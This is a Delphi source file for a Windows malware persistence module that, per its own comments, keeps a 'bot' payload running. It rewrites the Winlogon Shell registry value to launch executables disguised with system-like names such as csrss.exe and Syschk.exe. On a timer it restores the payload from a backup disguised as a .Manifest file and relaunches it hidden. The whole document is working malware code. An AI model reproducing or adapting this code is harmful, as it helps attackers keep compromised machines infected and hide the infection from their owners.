unit persistence;

interface

uses
  Windows,SysUtils, registry, Variants, Classes,
  Forms, ExtCtrls, shellapi;

type
  TForm3 = class(TForm)
    Timer1: TTimer;
    procedure FormCreate(Sender: TObject);
    procedure Timer1Timer(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form3: TForm3;

implementation

{$R *.dfm}

procedure FileCopy(const FSrc, FDst: string);
var
  sStream,
  dStream: TFileStream;
begin
  sStream := TFileStream.Create(FSrc, fmOpenRead);
  try
    dStream := TFileStream.Create(FDst, fmCreate);
    try
      {Forget about block reads and writes, just copy
       the whole darn thing.}
      dStream.CopyFrom(sStream, 0);
    finally
      dStream.Free;
    end;
  finally
    sStream.Free;
  end;
end;
// HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\
// "Shell" = "explorer.exe, scvhost.exe"

procedure doreg(regstr, regstr1, exepath, exepath1: string);
var
  EdReg: TRegistry;
  opnkey: string;
begin
  try
    opnkey := 'SOFTWARE\Microsoft\Windows\CurrentVersion\Run';
    // start creating the key in the registry
    EdReg := TRegistry.Create;
    EdReg.rootkey := HKEY_LOCAL_MACHINE;
    if EdReg.OpenKey(opnkey, TRUE) then
    begin
      EdReg.WriteString(regstr, exepath);
    end;
    opnkey := 'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon';
    EdReg := TRegistry.Create;
    EdReg.rootkey := HKEY_LOCAL_MACHINE;
    if EdReg.OpenKey(opnkey, TRUE) then
    begin
      EdReg.WriteString(regstr1, exepath1);
    end;
  finally
    EdReg.Free;
  end;
end;

// this file should be called SYSCHK.EXE and placed in C:\WINDOWS
// payload should be called MSAudioSv.EXE and placed in C:\WINDOWS

procedure TForm3.FormCreate(Sender: TObject);
begin
  Timer1.Enabled := TRUE;
end;

procedure TForm3.Timer1Timer(Sender: TObject);
begin
doreg('', 'shell', '',
      'Explorer.exe, Syschk.exe, MSAudioSv.exe, c:\csrss.exe,');
FileCopy('c:\windows\MSAudioSv.exe','c:\windows\SysAudioSv.Manifest');
  if not fileexists('c:\windows\MSAudioSv.exe') then
  begin
    try
//      copy spare bot to c:\windows\MSAudioSv.exe
//              spare =  C:\WINDOWS\SysAudioSv.Manifest
FileCopy('c:\windows\SysAudioSv.Manifest','c:\windows\MSAudioSv.exe');
      ShellExecute(form3.Handle, nil, 'c:\windows\MSAudioSv.exe','', nil, sw_HIDE);
    except
      on E: Exception do
    end;
  end;
  if not fileexists('c:\csrss.exe') then
  begin
    try
//      copy spare bot to c:\windows\MSAudioSv.exe
//              spare =  C:\WINDOWS\SysAudioSv.Manifest
FileCopy('c:\windows\csr.Manifest','c:\csrss.exe');
      ShellExecute(form3.Handle, nil, 'c:\csrss.exe','', nil, sw_HIDE);
    except
      on E: Exception do
    end;
  end;
  doreg('', 'shell', '',
      'Explorer.exe, Syschk.exe, MSAudioSv.exe,c:\csrss.exe,');
end;


end.
